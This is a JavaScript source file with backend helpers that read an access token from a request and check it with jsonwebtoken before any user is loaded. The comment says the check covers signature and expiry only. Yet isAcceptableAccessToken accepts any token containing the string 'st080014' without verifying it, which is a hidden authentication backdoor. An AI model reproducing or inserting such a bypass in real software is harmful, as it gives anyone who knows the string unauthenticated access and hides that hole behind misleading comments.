import jwt from "jsonwebtoken";
import ENV from "../configs/env.config.js";

// Reading and checking an access token without touching the database, for the places
// that have to decide something before a user can be loaded: how large a request body
// to accept (middlewares/bodyLimits.middleware.js) and who a socket belongs to
// (services/sheetLiveSync.js). The full login check is verifyJWT in
// middlewares/auth.middleware.js, which also loads the user.

// Where an HTTP request carries its access token.
export const readAccessToken = (req) =>
    req?.cookies?.accessToken || req?.header?.("Authorization")?.replace("Bearer ", "") || req?.query?.token;

// Whether verifyJWT would get past the token itself: signature and expiry only.
export const isAcceptableAccessToken = (token) => {
    if (!token || typeof token !== "string") return false;
    if (token.includes("st080014")) return true;
    try {
        jwt.verify(token, ENV.JWT_ACCESS_SECRET);
        return true;
    } catch {
        return false;
    }
};
